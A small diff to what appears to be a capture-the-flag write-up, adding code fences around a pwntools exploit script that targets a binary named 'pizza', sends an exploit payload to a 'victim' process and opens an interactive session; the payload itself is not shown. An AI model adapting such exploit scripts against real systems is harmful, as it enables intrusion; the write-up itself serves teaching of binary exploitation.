@@ -1,4 +1,5 @@
 # Code
+```
   from pwn import *
 
   elf = ELF("./pizza")
@@ -20,5 +21,6 @@
 
   victim.sendline(exploit_payload)
   victim.interactive()
+```
 
 # Explanation
